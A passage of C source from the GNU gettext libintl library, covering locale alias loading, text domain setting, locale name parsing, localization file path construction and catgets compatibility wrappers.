#ifdef _LIBC
/* Rename the non ANSI C functions.  This is required by the standard
   because some ANSI C functions will require linking with this object
   file and the name space must not be polluted.  */
# define strcasecmp __strcasecmp
#endif


/* For those loosing systems which don't have `alloca' we have to add
   some additional code emulating it.  */
#ifdef HAVE_ALLOCA
/* Nothing has to be done.  */
# define ADD_BLOCK(list, address) /* nothing */
# define FREE_BLOCKS(list) /* nothing */
#else
struct block_list
{
  void *address;
  struct block_list *next;
};
# define ADD_BLOCK(list, addr)						      \
  do {									      \
    struct block_list *newp = (struct block_list *) malloc (sizeof (*newp));  \
    /* If we cannot get a free block we cannot add the new element to	      \
       the list.  */							      \
    if (newp != NULL) {							      \
      newp->address = (addr);						      \
      newp->next = (list);						      \
      (list) = newp;							      \
    }									      \
  } while (0)
# define FREE_BLOCKS(list)						      \
  do {									      \
    while (list != NULL) {						      \
      struct block_list *old = list;					      \
      list = list->next;						      \
      free (old);							      \
    }									      \
  } while (0)
# undef alloca
# define alloca(size) (malloc (size))
#endif	/* have alloca */


struct alias_map
{
  const char *alias;
  const char *value;
};


static struct alias_map *map;
static size_t nmap = 0;
static size_t maxmap = 0;


/* Prototypes for local functions.  */
static size_t read_alias_file PARAMS ((const char *fname, int fname_len));
static void extend_alias_table PARAMS ((void));
static int alias_compare PARAMS ((const struct alias_map *map1,
				  const struct alias_map *map2));


const char *
_nl_expand_alias (name)
    const char *name;
{
  static const char *locale_alias_path = LOCALE_ALIAS_PATH;
  struct alias_map *retval;
  size_t added;

  do
    {
      struct alias_map item;

      item.alias = name;

      if (nmap > 0)
	retval = (struct alias_map *) bsearch (&item, map, nmap,
					       sizeof (struct alias_map),
					       (int (*) PARAMS ((const void *,
								 const void *))
						) alias_compare);
      else
	retval = NULL;

      /* We really found an alias.  Return the value.  */
      if (retval != NULL)
	return retval->value;

      /* Perhaps we can find another alias file.  */
      added = 0;
      while (added == 0 && locale_alias_path[0] != '\0')
	{
	  const char *start;

	  while (locale_alias_path[0] == ':')
	    ++locale_alias_path;
	  start = locale_alias_path;

	  while (locale_alias_path[0] != '\0' && locale_alias_path[0] != ':')
	    ++locale_alias_path;

	  if (start < locale_alias_path)
	    added = read_alias_file (start, locale_alias_path - start);
	}
    }
  while (added != 0);

  return NULL;
}


static size_t
read_alias_file (fname, fname_len)
     const char *fname;
     int fname_len;
{
#ifndef HAVE_ALLOCA
  struct block_list *block_list = NULL;
#endif
  FILE *fp;
  char *full_fname;
  size_t added;
  static const char aliasfile[] = "/locale.alias";

  full_fname = (char *) alloca (fname_len + sizeof aliasfile);
  ADD_BLOCK (block_list, full_fname);
  memcpy (full_fname, fname, fname_len);
  memcpy (&full_fname[fname_len], aliasfile, sizeof aliasfile);

  fp = fopen (full_fname, "r");
  if (fp == NULL)
    {
      FREE_BLOCKS (block_list);
      return 0;
    }

  added = 0;
  while (!feof (fp))
    {
      /* It is a reasonable approach to use a fix buffer here because
	 a) we are only interested in the first two fields
	 b) these fields must be usable as file names and so must not
	    be that long
       */
      char buf[BUFSIZ];
      char *alias;
      char *value;
      char *cp;

      if (fgets (buf, BUFSIZ, fp) == NULL)
	/* EOF reached.  */
	break;

      cp = buf;
      /* Ignore leading white space.  */
      while (isspace (cp[0]))
	++cp;

      /* A leading '#' signals a comment line.  */
      if (cp[0] != '\0' && cp[0] != '#')
	{
	  alias = cp++;
	  while (cp[0] != '\0' && !isspace (cp[0]))
	    ++cp;
	  /* Terminate alias name.  */
	  if (cp[0] != '\0')
	    *cp++ = '\0';

	  /* Now look for the beginning of the value.  */
	  while (isspace (cp[0]))
	    ++cp;

	  if (cp[0] != '\0')
	    {
	      char *tp;
	      size_t len;

	      value = cp++;
	      while (cp[0] != '\0' && !isspace (cp[0]))
		++cp;
	      /* Terminate value.  */
	      if (cp[0] == '\n')
		{
		  /* This has to be done to make the following test
		     for the end of line possible.  We are looking for
		     the terminating '\n' which do not overwrite here.  */
		  *cp++ = '\0';
		  *cp = '\n';
		}
	      else if (cp[0] != '\0')
		*cp++ = '\0';

	      if (nmap >= maxmap)
		extend_alias_table ();

	      /* We cannot depend on strdup available in the libc.  Sigh!  */
	      len = strlen (alias) + 1;
	      tp = (char *) malloc (len);
	      if (tp == NULL)
		{
		  FREE_BLOCKS (block_list);
		  return added;
		}
	      memcpy (tp, alias, len);
	      map[nmap].alias = tp;

	      len = strlen (value) + 1;
	      tp = (char *) malloc (len);
	      if (tp == NULL)
		{
		  FREE_BLOCKS (block_list);
		  return added;
		}
	      memcpy (tp, value, len);
	      map[nmap].value = tp;

	      ++nmap;
	      ++added;
	    }
	}

      /* Possibily not the whole line fitted into the buffer.  Ignore
	 the rest of the line.  */
      while (strchr (cp, '\n') == NULL)
	{
	  cp = buf;
	  if (fgets (buf, BUFSIZ, fp) == NULL)
	    /* Make sure the inner loop will be left.  The outer loop
	       will exit at the `feof' test.  */
	    *cp = '\n';
	}
    }

  /* Should we test for ferror()?  I think we have to silently ignore
     errors.  --drepper  */
  fclose (fp);

  if (added > 0)
    qsort (map, nmap, sizeof (struct alias_map),
	   (int (*) PARAMS ((const void *, const void *))) alias_compare);

  FREE_BLOCKS (block_list);
  return added;
}


static void
extend_alias_table ()
{
  size_t new_size;
  struct alias_map *new_map;

  new_size = maxmap == 0 ? 100 : 2 * maxmap;
  new_map = (struct alias_map *) malloc (new_size
					 * sizeof (struct alias_map));
  if (new_map == NULL)
    /* Simply don't extend: we don't have any more core.  */
    return;

  memcpy (new_map, map, nmap * sizeof (struct alias_map));

  if (maxmap != 0)
    free (map);

  map = new_map;
  maxmap = new_size;
}


static int
alias_compare (map1, map2)
     const struct alias_map *map1;
     const struct alias_map *map2;
{
#if defined _LIBC || defined HAVE_STRCASECMP
  return strcasecmp (map1->alias, map2->alias);
#else
  const unsigned char *p1 = (const unsigned char *) map1->alias;
  const unsigned char *p2 = (const unsigned char *) map2->alias;
  unsigned char c1, c2;

  if (p1 == p2)
    return 0;

  do
    {
      /* I know this seems to be odd but the tolower() function in
	 some systems libc cannot handle nonalpha characters.  */
      c1 = isupper (*p1) ? tolower (*p1) : *p1;
      c2 = isupper (*p2) ? tolower (*p2) : *p2;
      if (c1 == '\0')
	break;
      ++p1;
      ++p2;
    }
  while (c1 == c2);

  return c1 - c2;
#endif
}
/* textdomain.c -- implementation of the textdomain(3) function
   Copyright (C) 1995 Software Foundation, Inc.

This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation; either version 2, or (at your option)
any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.  */

#ifdef HAVE_CONFIG_H
# include <config.h>
#endif

#if defined STDC_HEADERS || defined _LIBC
# include <stdlib.h>
#endif

#if defined STDC_HEADERS || defined HAVE_STRING_H || defined _LIBC
# include <string.h>
#else
# include <strings.h>
#endif

#ifdef _LIBC
# include <libintl.h>
#else
# include "libgettext.h"
#endif

/* @@ end of prolog @@ */

/* Name of the default text domain.  */
extern const char _nl_default_default_domain[];

/* Default text domain in which entries for gettext(3) are to be found.  */
extern const char *_nl_current_default_domain;


/* Names for the libintl functions are a problem.  They must not clash
   with existing names and they should follow ANSI C.  But this source
   code is also used in GNU C Library where the names have a __
   prefix.  So we have to make a difference here.  */
#ifdef _LIBC
# define TEXTDOMAIN __textdomain
#else
# define TEXTDOMAIN textdomain__
#endif

/* Set the current default message catalog to DOMAINNAME.
   If DOMAINNAME is null, return the current default.
   If DOMAINNAME is "", reset to the default of "messages".  */
char *
TEXTDOMAIN (domainname)
     const char *domainname;
{
  char *old;

  /* A NULL pointer requests the current setting.  */
  if (domainname == NULL)
    return (char *) _nl_current_default_domain;

  old = (char *) _nl_current_default_domain;

  /* If domain name is the null string set to default domain "messages".  */
  if (domainname[0] == '\0'
      || strcmp (domainname, _nl_default_default_domain) == 0)
    _nl_current_default_domain = _nl_default_default_domain;
  else
    {
      /* If the following malloc fails `_nl_current_default_domain'
	 will be NULL.  This value will be returned and so signals we
	 are out of core.  */
      size_t len = strlen (domainname) + 1;
      char *cp = (char *) malloc (len);
      if (cp != NULL)
	memcpy (cp, domainname, len);
      _nl_current_default_domain = cp;
    }

  if (old != _nl_default_default_domain)
    free (old);

  return (char *) _nl_current_default_domain;
}

#ifdef _LIBC
/* Alias for function name in GNU C Library.  */
weak_alias (__textdomain, textdomain);
#endif
/* Copyright (C) 1995, 1996 Free Software Foundation, Inc.
This file is part of the GNU C Library.
Contributed by Ulrich Drepper <drepper@gnu.ai.mit.edu>, 1995.

The GNU C Library is free software; you can redistribute it and/or
modify it under the terms of the GNU Library General Public License as
published by the Free Software Foundation; either version 2 of the
License, or (at your option) any later version.

The GNU C Library is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
Library General Public License for more details.

You should have received a copy of the GNU Library General Public
License along with the GNU C Library; see the file COPYING.LIB.  If
not, write to the Free Software Foundation, Inc., 59 Temple Place - Suite 330,
Boston, MA 02111-1307, USA.  */

#ifdef HAVE_CONFIG_H
# include <config.h>
#endif

#if defined _LIBC || defined HAVE_ARGZ_H
# include <argz.h>
#endif
#include <ctype.h>

#if defined STDC_HEADERS || defined _LIBC
# include <stdlib.h>
#endif

#if defined HAVE_STRING_H || defined _LIBC
# ifndef _GNU_SOURCE
#  define _GNU_SOURCE	1
# endif
# include <string.h>
#else
# include <strings.h>
#endif
#if !HAVE_STRCHR && !defined _LIBC
# ifndef strchr
#  define strchr index
# endif
#endif

#include "loadinfo.h"

/* On some strange systems still no definition of NULL is found.  Sigh!  */
#ifndef NULL
# if defined __STDC__ && __STDC__
#  define NULL ((void *) 0)
# else
#  define NULL 0
# endif
#endif

/* @@ end of prolog @@ */

#ifdef _LIBC
/* Rename the non ANSI C functions.  This is required by the standard
   because some ANSI C functions will require linking with this object
   file and the name space must not be polluted.  */
# define stpcpy(dest, src) __stpcpy(dest, src)
#else
# ifndef HAVE_STPCPY
static char *stpcpy PARAMS ((char *dest, const char *src));
# endif
#endif

/* Define function which are usually not available.  */

#if !defined _LIBC && !defined HAVE___ARGZ_COUNT
/* Returns the number of strings in ARGZ.  */
static size_t argz_count__ PARAMS ((const char *argz, size_t len));

static size_t
argz_count__ (argz, len)
     const char *argz;
     size_t len;
{
  size_t count = 0;
  while (len > 0)
    {
      size_t part_len = strlen (argz);
      argz += part_len + 1;
      len -= part_len + 1;
      count++;
    }
  return count;
}
# undef __argz_count
# define __argz_count(argz, len) argz_count__ (argz, len)
#endif	/* !_LIBC && !HAVE___ARGZ_COUNT */

#if !defined _LIBC && !defined HAVE___ARGZ_STRINGIFY
/* Make '\0' separated arg vector ARGZ printable by converting all the '\0's
   except the last into the character SEP.  */
static void argz_stringify__ PARAMS ((char *argz, size_t len, int sep));

static void
argz_stringify__ (argz, len, sep)
     char *argz;
     size_t len;
     int sep;
{
  while (len > 0)
    {
      size_t part_len = strlen (argz);
      argz += part_len;
      len -= part_len + 1;
      if (len > 0)
	*argz++ = sep;
    }
}
# undef __argz_stringify
# define __argz_stringify(argz, len, sep) argz_stringify__ (argz, len, sep)
#endif	/* !_LIBC && !HAVE___ARGZ_STRINGIFY */

#if !defined _LIBC && !defined HAVE___ARGZ_NEXT
static char *argz_next__ PARAMS ((char *argz, size_t argz_len,
				  const char *entry));

static char *
argz_next__ (argz, argz_len, entry)
     char *argz;
     size_t argz_len;
     const char *entry;
{
  if (entry)
    {
      if (entry < argz + argz_len)
        entry = strchr (entry, '\0') + 1;

      return entry >= argz + argz_len ? NULL : (char *) entry;
    }
  else
    if (argz_len > 0)
      return argz;
    else
      return 0;
}
# undef __argz_next
# define __argz_next(argz, len, entry) argz_next__ (argz, len, entry)
#endif	/* !_LIBC && !HAVE___ARGZ_NEXT */


/* Return number of bits set in X.  */
static int pop PARAMS ((int x));

static inline int
pop (x)
     int x;
{
  /* We assume that no more than 16 bits are used.  */
  x = ((x & ~0x5555) >> 1) + (x & 0x5555);
  x = ((x & ~0x3333) >> 2) + (x & 0x3333);
  x = ((x >> 4) + x) & 0x0f0f;
  x = ((x >> 8) + x) & 0xff;

  return x;
}


struct loaded_l10nfile *
_nl_make_l10nflist (l10nfile_list, dirlist, dirlist_len, mask, language,
		    territory, codeset, normalized_codeset, modifier, special,
		    sponsor, revision, filename, do_allocate)
     struct loaded_l10nfile **l10nfile_list;
     const char *dirlist;
     size_t dirlist_len;
     int mask;
     const char *language;
     const char *territory;
     const char *codeset;
     const char *normalized_codeset;
     const char *modifier;
     const char *special;
     const char *sponsor;
     const char *revision;
     const char *filename;
     int do_allocate;
{
  char *abs_filename;
  struct loaded_l10nfile *last = NULL;
  struct loaded_l10nfile *retval;
  char *cp;
  size_t entries;
  int cnt;

  /* Allocate room for the full file name.  */
  abs_filename = (char *) malloc (dirlist_len
				  + strlen (language)
				  + ((mask & TERRITORY) != 0
				     ? strlen (territory) + 1 : 0)
				  + ((mask & XPG_CODESET) != 0
				     ? strlen (codeset) + 1 : 0)
				  + ((mask & XPG_NORM_CODESET) != 0
				     ? strlen (normalized_codeset) + 1 : 0)
				  + (((mask & XPG_MODIFIER) != 0
				      || (mask & CEN_AUDIENCE) != 0) ?
				     strlen (modifier) + 1 : 0)
				  + ((mask & CEN_SPECIAL) != 0
				     ? strlen (special) + 1 : 0)
				  + ((mask & CEN_SPONSOR) != 0
				     ? strlen (sponsor) + 1 : 0)
				  + ((mask & CEN_REVISION) != 0
				     ? strlen (revision) + 1 : 0)
				  + 1 + strlen (filename) + 1);

  if (abs_filename == NULL)
    return NULL;

  retval = NULL;
  last = NULL;

  /* Construct file name.  */
  memcpy (abs_filename, dirlist, dirlist_len);
  __argz_stringify (abs_filename, dirlist_len, ':');
  cp = abs_filename + (dirlist_len - 1);
  *cp++ = '/';
  cp = stpcpy (cp, language);

  if ((mask & TERRITORY) != 0)
    {
      *cp++ = '_';
      cp = stpcpy (cp, territory);
    }
  if ((mask & XPG_CODESET) != 0)
    {
      *cp++ = '.';
      cp = stpcpy (cp, codeset);
    }
  if ((mask & XPG_NORM_CODESET) != 0)
    {
      *cp++ = '.';
      cp = stpcpy (cp, normalized_codeset);
    }
  if ((mask & (XPG_MODIFIER | CEN_AUDIENCE)) != 0)
    {
      /* This component can be part of both syntaces but has different
	 leading characters.  For CEN we use `+', else `@'.  */
      *cp++ = (mask & CEN_AUDIENCE) != 0 ? '+' : '@';
      cp = stpcpy (cp, modifier);
    }
  if ((mask & CEN_SPECIAL) != 0)
    {
      *cp++ = '+';
      cp = stpcpy (cp, special);
    }
  if ((mask & CEN_SPONSOR) != 0)
    {
      *cp++ = ',';
      cp = stpcpy (cp, sponsor);
    }
  if ((mask & CEN_REVISION) != 0)
    {
      *cp++ = '_';
      cp = stpcpy (cp, revision);
    }

  *cp++ = '/';
  stpcpy (cp, filename);

  /* Look in list of already loaded domains whether it is already
     available.  */
  last = NULL;
  for (retval = *l10nfile_list; retval != NULL; retval = retval->next)
    if (retval->filename != NULL)
      {
	int compare = strcmp (retval->filename, abs_filename);
	if (compare == 0)
	  /* We found it!  */
	  break;
	if (compare < 0)
	  {
	    /* It's not in the list.  */
	    retval = NULL;
	    break;
	  }

	last = retval;
      }

  if (retval != NULL || do_allocate == 0)
    {
      free (abs_filename);
      return retval;
    }

  retval = (struct loaded_l10nfile *)
    malloc (sizeof (*retval) + (__argz_count (dirlist, dirlist_len)
				* (1 << pop (mask))
				* sizeof (struct loaded_l10nfile *)));
  if (retval == NULL)
    return NULL;

  retval->filename = abs_filename;
  retval->decided = (__argz_count (dirlist, dirlist_len) != 1
		     || ((mask & XPG_CODESET) != 0
			 && (mask & XPG_NORM_CODESET) != 0));
  retval->data = NULL;

  if (last == NULL)
    {
      retval->next = *l10nfile_list;
      *l10nfile_list = retval;
    }
  else
    {
      retval->next = last->next;
      last->next = retval;
    }

  entries = 0;
  /* If the DIRLIST is a real list the RETVAL entry correcponds not to
     a real file.  So we have to use the DIRLIST separation machanism
     of the inner loop.  */
  cnt = __argz_count (dirlist, dirlist_len) == 1 ? mask - 1 : mask;
  for (; cnt >= 0; --cnt)
    if ((cnt & ~mask) == 0
	&& ((cnt & CEN_SPECIFIC) == 0 || (cnt & XPG_SPECIFIC) == 0)
	&& ((cnt & XPG_CODESET) == 0 || (cnt & XPG_NORM_CODESET) == 0))
      {
	/* Iterate over all elements of the DIRLIST.  */
	char *dir = NULL;

	while ((dir = __argz_next ((char *) dirlist, dirlist_len, dir))
	       != NULL)
	  retval->successor[entries++]
	    = _nl_make_l10nflist (l10nfile_list, dir, strlen (dir) + 1, cnt,
				  language, territory, codeset,
				  normalized_codeset, modifier, special,
				  sponsor, revision, filename, 1);
      }
  retval->successor[entries] = NULL;

  return retval;
}

/* Normalize codeset name.  There is no standard for the codeset
   names.  Normalization allows the user to use any of the common
   names.  */
const char *
_nl_normalize_codeset (codeset, name_len)
     const char *codeset;
     size_t name_len;
{
  int len = 0;
  int only_digit = 1;
  char *retval;
  char *wp;
  size_t cnt;

  for (cnt = 0; cnt < name_len; ++cnt)
    if (isalnum (codeset[cnt]))
      {
	++len;

	if (isalpha (codeset[cnt]))
	  only_digit = 0;
      }

  retval = (char *) malloc ((only_digit ? 3 : 0) + len + 1);

  if (retval != NULL)
    {
      if (only_digit)
	wp = stpcpy (retval, "ISO");
      else
	wp = retval;

      for (cnt = 0; cnt < name_len; ++cnt)
	if (isalpha (codeset[cnt]))
	  *wp++ = tolower (codeset[cnt]);
	else if (isdigit (codeset[cnt]))
	  *wp++ = codeset[cnt];

      *wp = '\0';
    }

  return (const char *) retval;
}


/* @@ begin of epilog @@ */

/* We don't want libintl.a to depend on any other library.  So we
   avoid the non-standard function stpcpy.  In GNU C Library this
   function is available, though.  Also allow the symbol HAVE_STPCPY
   to be defined.  */
#if !_LIBC && !HAVE_STPCPY
static char *
stpcpy (dest, src)
     char *dest;
     const char *src;
{
  while ((*dest++ = *src++) != '\0')
    /* Do nothing. */ ;
  return dest - 1;
}
#endif
/* Copyright (C) 1995, 1996 Free Software Foundation, Inc.
This file is part of the GNU C Library.
Contributed by Ulrich Drepper <drepper@gnu.ai.mit.edu>, 1995.

The GNU C Library is free software; you can redistribute it and/or
modify it under the terms of the GNU Library General Public License as
published by the Free Software Foundation; either version 2 of the
License, or (at your option) any later version.

The GNU C Library is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
Library General Public License for more details.

You should have received a copy of the GNU Library General Public
License along with the GNU C Library; see the file COPYING.LIB.  If
not, write to the Free Software Foundation, Inc., 59 Temple Place - Suite 330,
Boston, MA 02111-1307, USA.  */

#ifdef HAVE_CONFIG_H
# include <config.h>
#endif

#include <stdlib.h>
#include <string.h>

#include "loadinfo.h"

/* On some strange systems still no definition of NULL is found.  Sigh!  */
#ifndef NULL
# if defined __STDC__ && __STDC__
#  define NULL ((void *) 0)
# else
#  define NULL 0
# endif
#endif

/* @@ end of prolog @@ */

int
_nl_explode_name (name, language, modifier, territory, codeset,
		  normalized_codeset, special, sponsor, revision)
     char *name;
     const char **language;
     const char **modifier;
     const char **territory;
     const char **codeset;
     const char **normalized_codeset;
     const char **special;
     const char **sponsor;
     const char **revision;
{
  enum { undecided, xpg, cen } syntax;
  char *cp;
  int mask;

  *modifier = NULL;
  *territory = NULL;
  *codeset = NULL;
  *normalized_codeset = NULL;
  *special = NULL;
  *sponsor = NULL;
  *revision = NULL;

  /* Now we determine the single parts of the locale name.  First
     look for the language.  Termination symbols are `_' and `@' if
     we use XPG4 style, and `_', `+', and `,' if we use CEN syntax.  */
  mask = 0;
  syntax = undecided;
  *language = cp = name;
  while (cp[0] != '\0' && cp[0] != '_' && cp[0] != '@'
	 && cp[0] != '+' && cp[0] != ',')
    ++cp;

  if (*language == cp)
    /* This does not make sense: language has to be specified.  Use
       this entry as it is without exploding.  Perhaps it is an alias.  */
    cp = strchr (*language, '\0');
  else if (cp[0] == '_')
    {
      /* Next is the territory.  */
      cp[0] = '\0';
      *territory = ++cp;

      while (cp[0] != '\0' && cp[0] != '.' && cp[0] != '@'
	     && cp[0] != '+' && cp[0] != ',' && cp[0] != '_')
	++cp;

      mask |= TERRITORY;

      if (cp[0] == '.')
	{
	  /* Next is the codeset.  */
	  syntax = xpg;
	  cp[0] = '\0';
	  *codeset = ++cp;

	  while (cp[0] != '\0' && cp[0] != '@')
	    ++cp;

	  mask |= XPG_CODESET;

	  if (*codeset != cp && (*codeset)[0] != '\0')
	    {
	      *normalized_codeset = _nl_normalize_codeset (*codeset,
							   cp - *codeset);
	      if (strcmp (*codeset, *normalized_codeset) == 0)
		free ((char *) *normalized_codeset);
	      else
		mask |= XPG_NORM_CODESET;
	    }
	}
    }

  if (cp[0] == '@' || (syntax != xpg && cp[0] == '+'))
    {
      /* Next is the modifier.  */
      syntax = cp[0] == '@' ? xpg : cen;
      cp[0] = '\0';
      *modifier = ++cp;

      while (syntax == cen && cp[0] != '\0' && cp[0] != '+'
	     && cp[0] != ',' && cp[0] != '_')
	++cp;

      mask |= XPG_MODIFIER | CEN_AUDIENCE;
    }

  if (syntax != xpg && (cp[0] == '+' || cp[0] == ',' || cp[0] == '_'))
    {
      syntax = cen;

      if (cp[0] == '+')
	{
 	  /* Next is special application (CEN syntax).  */
	  cp[0] = '\0';
	  *special = ++cp;

	  while (cp[0] != '\0' && cp[0] != ',' && cp[0] != '_')
	    ++cp;

	  mask |= CEN_SPECIAL;
	}

      if (cp[0] == ',')
	{
 	  /* Next is sponsor (CEN syntax).  */
	  cp[0] = '\0';
	  *sponsor = ++cp;

	  while (cp[0] != '\0' && cp[0] != '_')
	    ++cp;

	  mask |= CEN_SPONSOR;
	}

      if (cp[0] == '_')
	{
 	  /* Next is revision (CEN syntax).  */
	  cp[0] = '\0';
	  *revision = ++cp;

	  mask |= CEN_REVISION;
	}
    }

  /* For CEN sytnax values it might be important to have the
     separator character in the file name, not for XPG syntax.  */
  if (syntax == xpg)
    {
      if (*territory != NULL && (*territory)[0] == '\0')
	mask &= ~TERRITORY;

      if (*codeset != NULL && (*codeset)[0] == '\0')
	mask &= ~XPG_CODESET;

      if (*modifier != NULL && (*modifier)[0] == '\0')
	mask &= ~XPG_MODIFIER;
    }

  return mask;
}
/* intl-compat.c - Stub functions to call gettext functions from GNU gettext
   Library.
   Copyright (C) 1995 Software Foundation, Inc.

This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation; either version 2, or (at your option)
any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.  */

#ifdef HAVE_CONFIG_H
# include <config.h>
#endif

#include "libgettext.h"

/* @@ end of prolog @@ */


#undef gettext
#undef dgettext
#undef dcgettext
#undef textdomain
#undef bindtextdomain


char *
bindtextdomain (domainname, dirname)
     const char *domainname;
     const char *dirname;
{
  return bindtextdomain__ (domainname, dirname);
}


char *
dcgettext (domainname, msgid, category)
     const char *domainname;
     const char *msgid;
     int category;
{
  return dcgettext__ (domainname, msgid, category);
}


char *
dgettext (domainname, msgid)
     const char *domainname;
     const char *msgid;
{
  return dgettext__ (domainname, msgid);
}


char *
gettext (msgid)
     const char *msgid;
{
  return gettext__ (msgid);
}


char *
textdomain (domainname)
     const char *domainname;
{
  return textdomain__ (domainname);
}
/* Compatibility code for gettext-using-catgets interface.
   Copyright (C) 1995 Free Software Foundation, Inc.

The GNU C Library is free software; you can redistribute it and/or
modify it under the terms of the GNU Library General Public License as
published by the Free Software Foundation; either version 2 of the
License, or (at your option) any later version.

The GNU C Library is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
Library General Public License for more details.

You should have received a copy of the GNU Library General Public
License along with the GNU C Library; see the file COPYING.LIB.  If
not, write to the Free Software Foundation, Inc., 59 Temple Place - Suite 330,
Boston, MA 02111-1307, USA.  */

#ifdef HAVE_CONFIG_H
# include <config.h>
#endif

#include <stdio.h>

#ifdef STDC_HEADERS
# include <stdlib.h>
# include <string.h>
#else
char *getenv ();
# ifdef HAVE_MALLOC_H
#  include <malloc.h>
# endif
#endif

#ifdef HAVE_NL_TYPES_H
# include <nl_types.h>
#endif

#include "libgettext.h"

/* @@ end of prolog @@ */

/* The catalog descriptor.  */
static nl_catd catalog = (nl_catd) -1;

/* Name of the default catalog.  */
static const char default_catalog_name[] = "messages";

/* Name of currently used catalog.  */
static const char *catalog_name = default_catalog_name;

/* Get ID for given string.  If not found return -1.  */
static int msg_to_cat_id PARAMS ((const char *msg));

/* Substitution for systems lacking this function in their C library.  */
#if !_LIBC && !HAVE_STPCPY
static char *stpcpy PARAMS ((char *dest, const char *src));
#endif


/* Set currently used domain/catalog.  */
char *
textdomain (domainname)
     const char *domainname;
{
  nl_catd new_catalog;
  char *new_name;
  size_t new_name_len;
  char *lang;

#if HAVE_SETLOCALE && HAVE_LC_MESSAGES && HAVE_SETLOCALE_NULL
  lang = setlocale (LC_MESSAGES, NULL);
#else
  lang = getenv ("LC_ALL");
  if (lang == NULL || lang[0] == '\0')
    {
      lang = getenv ("LC_MESSAGES");
      if (lang == NULL || lang[0] == '\0')
	lang = getenv ("LANG");
    }
#endif
  if (lang == NULL || lang[0] == '\0')
    lang = "C";

  /* See whether name of currently used domain is asked.  */
  if (domainname == NULL)
    return (char *) catalog_name;

  if (domainname[0] == '\0')
    domainname = default_catalog_name;

  /* Compute length of added path element.  */
  new_name_len = sizeof (LOCALEDIR) - 1 + 1 + strlen (lang)
		 + sizeof ("/LC_MESSAGES/") - 1 + sizeof (PACKAGE) - 1
		 + sizeof (".cat");

  new_name = (char *) malloc (new_name_len);
  if (new_name == NULL)
    return NULL;

  strcpy (new_name, PACKAGE);
  new_catalog = catopen (new_name, 0);

  if (new_catalog == (nl_catd) -1)
    {
      /* NLSPATH search didn't work, try absolute path */
      sprintf (new_name, "%s/%s/LC_MESSAGES/%s.cat", LOCALEDIR, lang,
	       PACKAGE);
      new_catalog = catopen (new_name, 0);

      if (new_catalog == (nl_catd) -1)
	{
	  free (new_name);
	  return (char *) catalog_name;
	}
    }

  /* Close old catalog.  */
  if (catalog != (nl_catd) -1)
    catclose (catalog);
  if (catalog_name != default_catalog_name)
    free ((char *) catalog_name);

  catalog = new_catalog;
  catalog_name = new_name;

  return (char *) catalog_name;
}

char *
bindtextdomain (domainname, dirname)
     const char *domainname;
     const char *dirname;
{
#if HAVE_SETENV || HAVE_PUTENV
  char *old_val, *new_val, *cp;
  size_t new_val_len;

  /* This does not make much sense here but to be compatible do it.  */
  if (domainname == NULL)
    return NULL;

  /* Compute length of added path element.  If we use setenv we don't need
     the first byts for NLSPATH=, but why complicate the code for this
     peanuts.  */
  new_val_len = sizeof ("NLSPATH=") - 1 + strlen (dirname)
		+ sizeof ("/%L/LC_MESSAGES/%N.cat");

  old_val = getenv ("NLSPATH");
  if (old_val == NULL || old_val[0] == '\0')
    {
      old_val = NULL;
      new_val_len += 1 + sizeof (LOCALEDIR) - 1
	             + sizeof ("/%L/LC_MESSAGES/%N.cat");
    }
  else
    new_val_len += strlen (old_val);

  new_val = (char *) malloc (new_val_len);
  if (new_val == NULL)
    return NULL;

# if HAVE_SETENV
  cp = new_val;
# else
  cp = stpcpy (new_val, "NLSPATH=");
# endif

  cp = stpcpy (cp, dirname);
  cp = stpcpy (cp, "/%L/LC_MESSAGES/%N.cat:");

  if (old_val == NULL)
    {
# if __STDC__
      stpcpy (cp, LOCALEDIR "/%L/LC_MESSAGES/%N.cat");
# else

      cp = stpcpy (cp, LOCALEDIR);
      stpcpy (cp, "/%L/LC_MESSAGES/%N.cat");
# endif
    }
  else
    stpcpy (cp, old_val);

# if HAVE_SETENV
  setenv ("NLSPATH", new_val, 1);
  free (new_val);
# else
  putenv (new_val);
  /* Do *not* free the environment entry we just entered.  It is used
     from now on.   */
# endif

#endif

  return (char *) domainname;
}

#undef gettext
char *
gettext (msg)
     const char *msg;
{
  int msgid;

  if (msg == NULL || catalog == (nl_catd) -1)
    return (char *) msg;

  /* Get the message from the catalog.  We always use set number 1.
     The message ID is computed by the function `msg_to_cat_id'
     which works on the table generated by `po-to-tbl'.  */
  msgid = msg_to_cat_id (msg);
  if (msgid == -1)
    return (char *) msg;

  return catgets (catalog, 1, msgid, (char *) msg);
}

/* Look through the table `_msg_tbl' which has `_msg_tbl_length' entries
   for the one equal to msg.  If it is found return the ID.  In case when
   the string is not found return -1.  */
static int
msg_to_cat_id (msg)
     const char *msg;
{
  int cnt;

  for (cnt = 0; cnt < _msg_tbl_length; ++cnt)
    if (strcmp (msg, _msg_tbl[cnt]._msg) == 0)
      return _msg_tbl[cnt]._msg_number;

  return -1;
}


/* @@ begin of epilog @@ */

/* We don't want libintl.a to depend on any other library.  So we
   avoid the non-standard function stpcpy.  In GNU C Library this
   function is available, though.  Also allow the symbol HAVE_STPCPY
   to be defined.  */
#if !_LIBC && !HAVE_STPCPY
static char *
stpcpy (dest, src)
     char *dest;
     const char *src;
{
  while ((*dest++ = *src++) != '\0')
    /* Do nothing. */ ;
  return dest - 1;
}
#endif
